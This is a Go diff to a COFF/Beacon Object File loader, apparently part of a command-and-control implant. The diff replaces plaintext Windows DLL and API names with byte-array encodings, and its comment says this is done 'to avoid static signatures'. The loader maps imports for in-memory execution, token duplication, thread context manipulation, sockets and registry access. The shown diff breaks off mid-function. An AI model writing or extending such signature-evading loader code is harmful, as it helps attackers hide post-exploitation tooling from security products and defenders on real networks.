@@ -31,13 +31,176 @@ const (
 	IMAGE_SCN_MEM_EXECUTE  = 0x20000000
 )
 
+// COFF loader strings (constructed to avoid static signatures)
 var (
-	kernel32           = syscall.MustLoadDLL("kernel32.dll")
-	ntdll              = syscall.MustLoadDLL("ntdll.dll")
-	procVirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
-	procVirtualProtect = kernel32.MustFindProc("VirtualProtect")
-	procVirtualFree    = kernel32.MustFindProc("VirtualFree")
-	procRtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
+	// DLL names
+	coffDllKernel32 = string([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c}) // kernel32.dll
+	coffDllNtdll    = string([]byte{0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c})                   // ntdll.dll
+	coffDllUser32   = string([]byte{0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})             // user32.dll
+	coffDllWs2_32   = string([]byte{0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})             // ws2_32.dll
+	coffDllAdvapi32 = string([]byte{0x61, 0x64, 0x76, 0x61, 0x70, 0x69, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c}) // advapi32.dll
+
+	// Prefixes/suffixes
+	coffPrefixImp  = string([]byte{0x5f, 0x5f, 0x69, 0x6d, 0x70, 0x5f}) // __imp_
+	coffSuffixDll  = string([]byte{0x2e, 0x64, 0x6c, 0x6c})             // .dll
+	coffPrefixUs   = string([]byte{0x5f})                               // _
+	coffSectionBss = string([]byte{0x2e, 0x62, 0x73, 0x73})             // .bss
+
+	// Kernel32 API names
+	coffApiFreeLibrary               = string([]byte{0x46, 0x72, 0x65, 0x65, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79})                                                                                     // FreeLibrary
+	coffApiLoadLibraryA              = string([]byte{0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41})                                                                               // LoadLibraryA
+	coffApiGetProcAddress            = string([]byte{0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73})                                                                   // GetProcAddress
+	coffApiGetModuleHandleA          = string([]byte{0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x41})                                                       // GetModuleHandleA
+	coffApiGetModuleFileNameA        = string([]byte{0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x4e, 0x61, 0x6d, 0x65, 0x41})                                           // GetModuleFileNameA
+	coffApiVirtualAlloc              = string([]byte{0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63})                                                                               // VirtualAlloc
+	coffApiVirtualFree               = string([]byte{0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x46, 0x72, 0x65, 0x65})                                                                                     // VirtualFree
+	coffApiVirtualProtect            = string([]byte{0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74})                                                                   // VirtualProtect
+	coffApiSetLastError              = string([]byte{0x53, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72})                                                                               // SetLastError
+	coffApiGetCurrentProcess         = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                 // GetCurrentProcess
+	coffApiGetProcessHeap            = string([]byte{0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x48, 0x65, 0x61, 0x70})                                                                   // GetProcessHeap
+	coffApiHeapAlloc                 = string([]byte{0x48, 0x65, 0x61, 0x70, 0x41, 0x6c, 0x6c, 0x6f, 0x63})                                                                                                 // HeapAlloc
+	coffApiHeapFree                  = string([]byte{0x48, 0x65, 0x61, 0x70, 0x46, 0x72, 0x65, 0x65})                                                                                                       // HeapFree
+	coffApiWideCharToMultiByte       = string([]byte{0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72, 0x54, 0x6f, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x42, 0x79, 0x74, 0x65})                                     // WideCharToMultiByte
+	coffApiGetCurrentThread          = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                       // GetCurrentThread
+	coffApiGetThreadContext          = string([]byte{0x47, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74})                                                       // GetThreadContext
+	coffApiSetThreadContext          = string([]byte{0x53, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74})                                                       // SetThreadContext
+	coffApiSuspendThread             = string([]byte{0x53, 0x75, 0x73, 0x70, 0x65, 0x6e, 0x64, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                                         // SuspendThread
+	coffApiResumeThread              = string([]byte{0x52, 0x65, 0x73, 0x75, 0x6d, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                                               // ResumeThread
+	coffApiCreateThread              = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                                               // CreateThread
+	coffApiExitThread                = string([]byte{0x45, 0x78, 0x69, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                                                           // ExitThread
+	coffApiGetSystemTime             = string([]byte{0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x54, 0x69, 0x6d, 0x65})                                                                         // GetSystemTime
+	coffApiGetLocalTime              = string([]byte{0x47, 0x65, 0x74, 0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x54, 0x69, 0x6d, 0x65})                                                                               // GetLocalTime
+	coffApiGetFileAttributesA        = string([]byte{0x47, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x41})                                           // GetFileAttributesA
+	coffApiSetFileAttributesA        = string([]byte{0x53, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x41})                                           // SetFileAttributesA
+	coffApiCreateFileA               = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x41})                                                                                     // CreateFileA
+	coffApiReadFile                  = string([]byte{0x52, 0x65, 0x61, 0x64, 0x46, 0x69, 0x6c, 0x65})                                                                                                       // ReadFile
+	coffApiWriteFile                 = string([]byte{0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65})                                                                                                 // WriteFile
+	coffApiCloseHandle               = string([]byte{0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                                                     // CloseHandle
+	coffApiGetFileSize               = string([]byte{0x47, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x53, 0x69, 0x7a, 0x65})                                                                                     // GetFileSize
+	coffApiGetFileSizeEx             = string([]byte{0x47, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x53, 0x69, 0x7a, 0x65, 0x45, 0x78})                                                                         // GetFileSizeEx
+	coffApiFileTimeToSystemTime      = string([]byte{0x46, 0x69, 0x6c, 0x65, 0x54, 0x69, 0x6d, 0x65, 0x54, 0x6f, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x54, 0x69, 0x6d, 0x65})                               // FileTimeToSystemTime
+	coffApiSystemTimeToTzSpecific    = string([]byte{0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x54, 0x69, 0x6d, 0x65, 0x54, 0x6f, 0x54, 0x7a, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x54, 0x69, 0x6d, 0x65}) // SystemTimeToTzSpecificLocalTime
+	coffApiFindFirstFileA            = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x46, 0x69, 0x72, 0x73, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x41})                                                                   // FindFirstFileA
+	coffApiFindNextFileA             = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x4e, 0x65, 0x78, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x41})                                                                         // FindNextFileA
+	coffApiFindClose                 = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x43, 0x6c, 0x6f, 0x73, 0x65})                                                                                                 // FindClose
+	coffApiGetLastError              = string([]byte{0x47, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72})                                                                               // GetLastError
+	coffApiRtlCopyMemory             = string([]byte{0x52, 0x74, 0x6c, 0x43, 0x6f, 0x70, 0x79, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79})                                                                         // RtlCopyMemory
+
+	// MSVCRT/String functions
+	coffFnStrlen    = string([]byte{0x73, 0x74, 0x72, 0x6c, 0x65, 0x6e})                                     // strlen
+	coffFnStrcmp    = string([]byte{0x73, 0x74, 0x72, 0x63, 0x6d, 0x70})                                     // strcmp
+	coffFnStrncmp   = string([]byte{0x73, 0x74, 0x72, 0x6e, 0x63, 0x6d, 0x70})                               // strncmp
+	coffFnStricmp   = string([]byte{0x5f, 0x73, 0x74, 0x72, 0x69, 0x63, 0x6d, 0x70})                         // _stricmp
+	coffFnStrnicmp  = string([]byte{0x5f, 0x73, 0x74, 0x72, 0x6e, 0x69, 0x63, 0x6d, 0x70})                   // _strnicmp
+	coffFnStrcpy    = string([]byte{0x73, 0x74, 0x72, 0x63, 0x70, 0x79})                                     // strcpy
+	coffFnStrncpy   = string([]byte{0x73, 0x74, 0x72, 0x6e, 0x63, 0x70, 0x79})                               // strncpy
+	coffFnStrcat    = string([]byte{0x73, 0x74, 0x72, 0x63, 0x61, 0x74})                                     // strcat
+	coffFnStrncat   = string([]byte{0x73, 0x74, 0x72, 0x6e, 0x63, 0x61, 0x74})                               // strncat
+	coffFnStrstr    = string([]byte{0x73, 0x74, 0x72, 0x73, 0x74, 0x72})                                     // strstr
+
+	// Memory functions
+	coffFnCalloc    = string([]byte{0x63, 0x61, 0x6c, 0x6c, 0x6f, 0x63})                                     // calloc
+	coffFnMalloc    = string([]byte{0x6d, 0x61, 0x6c, 0x6c, 0x6f, 0x63})                                     // malloc
+	coffFnFree      = string([]byte{0x66, 0x72, 0x65, 0x65})                                                 // free
+	coffFnRealloc   = string([]byte{0x72, 0x65, 0x61, 0x6c, 0x6c, 0x6f, 0x63})                               // realloc
+	coffFnMemcpy    = string([]byte{0x6d, 0x65, 0x6d, 0x63, 0x70, 0x79})                                     // memcpy
+	coffFnMemset    = string([]byte{0x6d, 0x65, 0x6d, 0x73, 0x65, 0x74})                                     // memset
+	coffFnMemmove   = string([]byte{0x6d, 0x65, 0x6d, 0x6d, 0x6f, 0x76, 0x65})                               // memmove
+	coffFnMemcmp    = string([]byte{0x6d, 0x65, 0x6d, 0x63, 0x6d, 0x70})                                     // memcmp
+
+	// Printf functions
+	coffFnVsnprintf  = string([]byte{0x76, 0x73, 0x6e, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x66})                   // vsnprintf
+	coffFnVsnprintfU = string([]byte{0x5f, 0x76, 0x73, 0x6e, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x66})             // _vsnprintf
+	coffFnSprintf    = string([]byte{0x73, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x66})                               // sprintf
+
+	// User32 functions
+	coffApiMessageBoxA        = string([]byte{0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x41})                               // MessageBoxA
+	coffApiMessageBoxW        = string([]byte{0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x57})                               // MessageBoxW
+	coffApiGetDesktopWindow   = string([]byte{0x47, 0x65, 0x74, 0x44, 0x65, 0x73, 0x6b, 0x74, 0x6f, 0x70, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77}) // GetDesktopWindow
+	coffApiGetForegroundWnd   = string([]byte{0x47, 0x65, 0x74, 0x46, 0x6f, 0x72, 0x65, 0x67, 0x72, 0x6f, 0x75, 0x6e, 0x64, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77}) // GetForegroundWindow
+	coffApiGetWindowTextA     = string([]byte{0x47, 0x65, 0x74, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x54, 0x65, 0x78, 0x74, 0x41})             // GetWindowTextA
+	coffApiGetWindowTextW     = string([]byte{0x47, 0x65, 0x74, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x54, 0x65, 0x78, 0x74, 0x57})             // GetWindowTextW
+	coffApiFindWindowA        = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x41})                               // FindWindowA
+	coffApiFindWindowW        = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x57})                               // FindWindowW
+
+	// WS2_32 functions
+	coffApiWSAStartup     = string([]byte{0x57, 0x53, 0x41, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70})                         // WSAStartup
+	coffApiWSACleanup     = string([]byte{0x57, 0x53, 0x41, 0x43, 0x6c, 0x65, 0x61, 0x6e, 0x75, 0x70})                         // WSACleanup
+	coffApiWSAGetLastErr  = string([]byte{0x57, 0x53, 0x41, 0x47, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72}) // WSAGetLastError
+	coffApiSocket         = string([]byte{0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74})                                                 // socket
+	coffApiClosesocket    = string([]byte{0x63, 0x6c, 0x6f, 0x73, 0x65, 0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74})                   // closesocket
+	coffApiBind           = string([]byte{0x62, 0x69, 0x6e, 0x64})                                                             // bind
+	coffApiListen         = string([]byte{0x6c, 0x69, 0x73, 0x74, 0x65, 0x6e})                                                 // listen
+	coffApiAccept         = string([]byte{0x61, 0x63, 0x63, 0x65, 0x70, 0x74})                                                 // accept
+	coffApiConnect        = string([]byte{0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74})                                           // connect
+	coffApiSend           = string([]byte{0x73, 0x65, 0x6e, 0x64})                                                             // send
+	coffApiRecv           = string([]byte{0x72, 0x65, 0x63, 0x76})                                                             // recv
+	coffApiSendto         = string([]byte{0x73, 0x65, 0x6e, 0x64, 0x74, 0x6f})                                                 // sendto
+	coffApiRecvfrom       = string([]byte{0x72, 0x65, 0x63, 0x76, 0x66, 0x72, 0x6f, 0x6d})                                     // recvfrom
+	coffApiSelect         = string([]byte{0x73, 0x65, 0x6c, 0x65, 0x63, 0x74})                                                 // select
+	coffApiGethostbyname  = string([]byte{0x67, 0x65, 0x74, 0x68, 0x6f, 0x73, 0x74, 0x62, 0x79, 0x6e, 0x61, 0x6d, 0x65})       // gethostbyname
+	coffApiGethostbyaddr  = string([]byte{0x67, 0x65, 0x74, 0x68, 0x6f, 0x73, 0x74, 0x62, 0x79, 0x61, 0x64, 0x64, 0x72})       // gethostbyaddr
+	coffApiInet_addr      = string([]byte{0x69, 0x6e, 0x65, 0x74, 0x5f, 0x61, 0x64, 0x64, 0x72})                               // inet_addr
+	coffApiInet_ntoa      = string([]byte{0x69, 0x6e, 0x65, 0x74, 0x5f, 0x6e, 0x74, 0x6f, 0x61})                               // inet_ntoa
+	coffApiHtons          = string([]byte{0x68, 0x74, 0x6f, 0x6e, 0x73})                                                       // htons
+	coffApiHtonl          = string([]byte{0x68, 0x74, 0x6f, 0x6e, 0x6c})                                                       // htonl
+	coffApiNtohs          = string([]byte{0x6e, 0x74, 0x6f, 0x68, 0x73})                                                       // ntohs
+	coffApiNtohl          = string([]byte{0x6e, 0x74, 0x6f, 0x68, 0x6c})                                                       // ntohl
+
+	// Advapi32 functions
+	coffApiRegOpenKeyExA       = string([]byte{0x52, 0x65, 0x67, 0x4f, 0x70, 0x65, 0x6e, 0x4b, 0x65, 0x79, 0x45, 0x78, 0x41})                               // RegOpenKeyExA
+	coffApiRegCloseKey         = string([]byte{0x52, 0x65, 0x67, 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x4b, 0x65, 0x79})                                           // RegCloseKey
+	coffApiRegQueryValueExA    = string([]byte{0x52, 0x65, 0x67, 0x51, 0x75, 0x65, 0x72, 0x79, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x45, 0x78, 0x41})             // RegQueryValueExA
+	coffApiRegSetValueExA      = string([]byte{0x52, 0x65, 0x67, 0x53, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x45, 0x78, 0x41})                         // RegSetValueExA
+	coffApiOpenProcessToken    = string([]byte{0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x54, 0x6f, 0x6b, 0x65, 0x6e})             // OpenProcessToken
+	coffApiGetTokenInformation = string([]byte{0x47, 0x65, 0x74, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e}) // GetTokenInformation
+	coffApiSetTokenInformation = string([]byte{0x53, 0x65, 0x74, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e}) // SetTokenInformation
+	coffApiDuplicateTokenEx    = string([]byte{0x44, 0x75, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x45, 0x78})             // DuplicateTokenEx
+	coffApiCreateProcessAsUserA = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x41, 0x73, 0x55, 0x73, 0x65, 0x72, 0x41}) // CreateProcessAsUserA
+
+	// Beacon API functions
+	coffFnBeaconOutput        = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x4f, 0x75, 0x74, 0x70, 0x75, 0x74})                                     // BeaconOutput
+	coffFnBeaconDataParse     = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x50, 0x61, 0x72, 0x73, 0x65})                   // BeaconDataParse
+	coffFnBeaconDataInt       = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x49, 0x6e, 0x74})                               // BeaconDataInt
+	coffFnBeaconDataShort     = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x53, 0x68, 0x6f, 0x72, 0x74})                   // BeaconDataShort
+	coffFnBeaconDataLength    = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x4c, 0x65, 0x6e, 0x67, 0x74, 0x68})             // BeaconDataLength
+	coffFnBeaconDataExtract   = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x45, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74})       // BeaconDataExtract
+	coffFnBeaconPrintf        = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x50, 0x72, 0x69, 0x6e, 0x74, 0x66})                                     // BeaconPrintf
+	coffFnBeaconFormatAlloc   = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x41, 0x6c, 0x6c, 0x6f, 0x63})       // BeaconFormatAlloc
+	coffFnBeaconFormatFree    = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x46, 0x72, 0x65, 0x65})             // BeaconFormatFree
+	coffFnBeaconFormatAppend  = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x41, 0x70, 0x70, 0x65, 0x6e, 0x64}) // BeaconFormatAppend
+	coffFnBeaconFormatPrintf  = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x50, 0x72, 0x69, 0x6e, 0x74, 0x66}) // BeaconFormatPrintf
+	coffFnBeaconFormatToStr   = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x54, 0x6f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67}) // BeaconFormatToString
+	coffFnBeaconFormatInt     = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x49, 0x6e, 0x74})                   // BeaconFormatInt
+
+	// Helper functions
+	coffFnBofstart       = string([]byte{0x62, 0x6f, 0x66, 0x73, 0x74, 0x61, 0x72, 0x74})                                     // bofstart
+	coffFnInternalPrintf = string([]byte{0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x5f, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x66}) // internal_printf
+	coffFnPrintoutput    = string([]byte{0x70, 0x72, 0x69, 0x6e, 0x74, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                   // printoutput
+	coffFnIntAlloc       = string([]byte{0x69, 0x6e, 0x74, 0x41, 0x6c, 0x6c, 0x6f, 0x63})                                     // intAlloc
+	coffFnIntFree        = string([]byte{0x69, 0x6e, 0x74, 0x46, 0x72, 0x65, 0x65})                                           // intFree
+	coffFnIntMemset      = string([]byte{0x69, 0x6e, 0x74, 0x4d, 0x65, 0x6d, 0x73, 0x65, 0x74})                               // intMemset
+	coffFnIntMemcpy      = string([]byte{0x69, 0x6e, 0x74, 0x4d, 0x65, 0x6d, 0x63, 0x70, 0x79})                               // intMemcpy
+	coffFnIntRealloc     = string([]byte{0x69, 0x6e, 0x74, 0x52, 0x65, 0x61, 0x6c, 0x6c, 0x6f, 0x63})                         // intRealloc
+	coffFnIntStrlen      = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x6c, 0x65, 0x6e})                               // intStrlen
+	coffFnIntStrcmp      = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x63, 0x6d, 0x70})                               // intStrcmp
+	coffFnIntStrncmp     = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x6e, 0x63, 0x6d, 0x70})                         // intStrncmp
+	coffFnIntStrcpy      = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x63, 0x70, 0x79})                               // intStrcpy
+	coffFnIntStrncpy     = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x6e, 0x63, 0x70, 0x79})                         // intStrncpy
+	coffFnIntStrcat      = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x63, 0x61, 0x74})                               // intStrcat
+	coffFnIntStrncat     = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x6e, 0x63, 0x61, 0x74})                         // intStrncat
+	coffFnToWideChar     = string([]byte{0x74, 0x6f, 0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72})                         // toWideChar
+	coffFnUtf8ToUtf16    = string([]byte{0x55, 0x74, 0x66, 0x38, 0x54, 0x6f, 0x55, 0x74, 0x66, 0x31, 0x36})                   // Utf8ToUtf16
+	coffFnUtf16ToUtf8    = string([]byte{0x55, 0x74, 0x66, 0x31, 0x36, 0x54, 0x6f, 0x55, 0x74, 0x66, 0x38})                   // Utf16ToUtf8
+)
+
+var (
+	coffKernel32       = syscall.MustLoadDLL(coffDllKernel32)
+	coffNtdll          = syscall.MustLoadDLL(coffDllNtdll)
+	procVirtualAlloc   = coffKernel32.MustFindProc(coffApiVirtualAlloc)
+	procVirtualProtect = coffKernel32.MustFindProc(coffApiVirtualProtect)
+	procVirtualFree    = coffKernel32.MustFindProc(coffApiVirtualFree)
+	procRtlCopyMemory  = coffNtdll.MustFindProc(coffApiRtlCopyMemory)
 	// Global map to keep allocated memory alive during BOF execution
 	bofAllocations = make(map[uintptr][]byte)
 	bofAllocMutex  sync.Mutex
@@ -64,14 +227,14 @@ func min(a, b int) int {
 }
 
 func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) uintptr {
-	if !strings.HasPrefix(symbolName, "__imp_") {
+	if !strings.HasPrefix(symbolName, coffPrefixImp) {
 		return 0
 	}
 
 	symbolName = symbolName[6:] // Remove __imp_
 
 	// Handle 32-bit naming convention
-	if strings.HasPrefix(symbolName, "_") {
+	if strings.HasPrefix(symbolName, coffPrefixUs) {
 		symbolName = symbolName[1:]
 	}
 
@@ -81,7 +244,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 	// Check for Dynamic Function Resolution naming ($)
 	parts := strings.Split(symbolName, "$")
 	if len(parts) == 2 {
-		libName = parts[0] + ".dll"
+		libName = parts[0] + coffSuffixDll
 		procName = parts[1]
 	} else {
 		procName = symbolName
@@ -89,24 +252,24 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 		// Map known functions to their libraries
 		switch procName {
 		// Kernel32 functions
-		case "FreeLibrary", "LoadLibraryA", "GetProcAddress", "GetModuleHandleA",
-			"GetModuleFileNameA", "VirtualAlloc", "VirtualFree", "VirtualProtect",
-			"SetLastError", "GetCurrentProcess", "GetProcessHeap", "HeapAlloc", "HeapFree",
-			"WideCharToMultiByte", "GetCurrentThread", "GetThreadContext",
-			"SetThreadContext", "SuspendThread", "ResumeThread", "CreateThread",
-			"ExitThread", "GetSystemTime", "GetLocalTime", "GetFileAttributesA",
-			"SetFileAttributesA", "CreateFileA", "ReadFile", "WriteFile",
-			"CloseHandle", "GetFileSize", "GetFileSizeEx", "FileTimeToSystemTime",
-			"SystemTimeToTzSpecificLocalTime":
-			libName = "kernel32.dll"
+		case coffApiFreeLibrary, coffApiLoadLibraryA, coffApiGetProcAddress, coffApiGetModuleHandleA,
+			coffApiGetModuleFileNameA, coffApiVirtualAlloc, coffApiVirtualFree, coffApiVirtualProtect,
+			coffApiSetLastError, coffApiGetCurrentProcess, coffApiGetProcessHeap, coffApiHeapAlloc, coffApiHeapFree,
+			coffApiWideCharToMultiByte, coffApiGetCurrentThread, coffApiGetThreadContext,
+			coffApiSetThreadContext, coffApiSuspendThread, coffApiResumeThread, coffApiCreateThread,
+			coffApiExitThread, coffApiGetSystemTime, coffApiGetLocalTime, coffApiGetFileAttributesA,
+			coffApiSetFileAttributesA, coffApiCreateFileA, coffApiReadFile, coffApiWriteFile,
+			coffApiCloseHandle, coffApiGetFileSize, coffApiGetFileSizeEx, coffApiFileTimeToSystemTime,
+			coffApiSystemTimeToTzSpecific:
+			libName = coffDllKernel32
 
-		case "FindFirstFileA":
-			hModule, err := syscall.LoadLibrary("kernel32.dll")
+		case coffApiFindFirstFileA:
+			hModule, err := syscall.LoadLibrary(coffDllKernel32)
 			if err != nil {
 				return 0
 			}
 
-			addr, err := syscall.GetProcAddress(hModule, "FindFirstFileA")
+			addr, err := syscall.GetProcAddress(hModule, coffApiFindFirstFileA)
 			if err != nil {
 				return 0
 			}
@@ -127,13 +290,13 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return ret
 			})
 
-		case "FindNextFileA":
-			hModule, err := syscall.LoadLibrary("kernel32.dll")
+		case coffApiFindNextFileA:
+			hModule, err := syscall.LoadLibrary(coffDllKernel32)
 			if err != nil {
 				return 0
 			}
 
-			addr, err := syscall.GetProcAddress(hModule, "FindNextFileA")
+			addr, err := syscall.GetProcAddress(hModule, coffApiFindNextFileA)
 			if err != nil {
 				return 0
 			}
@@ -146,13 +309,13 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return ret
 			})
 
-		case "FindClose":
-			hModule, err := syscall.LoadLibrary("kernel32.dll")
+		case coffApiFindClose:
+			hModule, err := syscall.LoadLibrary(coffDllKernel32)
 			if err != nil {
 				return 0
 			}
 
-			addr, err := syscall.GetProcAddress(hModule, "FindClose")
+			addr, err := syscall.GetProcAddress(hModule, coffApiFindClose)
 			if err != nil {
 				return 0
 			}
@@ -162,9 +325,9 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return ret
 			})
 
-		case "GetLastError":
-			kernel32 := syscall.MustLoadDLL("kernel32.dll")
